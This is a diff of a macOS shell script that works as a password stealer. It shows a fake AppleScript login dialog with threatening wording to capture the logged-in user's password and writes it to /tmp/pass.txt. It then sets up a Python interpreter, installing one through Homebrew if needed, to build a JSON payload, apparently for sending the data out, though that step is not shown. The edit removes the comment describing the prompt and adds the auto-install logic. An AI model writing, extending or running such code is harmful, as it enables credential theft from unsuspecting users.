@@ -27,9 +27,6 @@ username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /logi
 capture="username=${username}\n____________________________________________\n\n"
 
 # --- Define AppleScript Login Prompt (Single Attempt) ---
-# The prompt shows:
-#   Line 1: "I know where you live, [FirstName]."
-#   Line 2: "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
 read -r -d '' applescriptCode <<'EOF'
 set fullName to (long user name of (system info))
 set firstName to word 1 of fullName
@@ -121,11 +118,23 @@ else
     # --- Save Data to Temporary File ---
     echo -e "$capture" > /tmp/pass.txt
     
-    # --- Determine Python Interpreter (Prefer python3) ---
+    # --- Determine Python Interpreter (Prefer python3; auto-install if missing) ---
     if command -v python3 &>/dev/null; then
         PYTHON=python3
     else
-        PYTHON=python
+        if command -v brew &>/dev/null; then
+            echo "python3 not found. Installing python3 via Homebrew..."
+            brew install python3
+            if command -v python3 &>/dev/null; then
+                PYTHON=python3
+            else
+                echo "Failed to install python3. Falling back to python."
+                PYTHON=python
+            fi
+        else
+            echo "Homebrew not found. Falling back to python."
+            PYTHON=python
+        fi
     fi
     
     # --- Generate JSON Payload ---
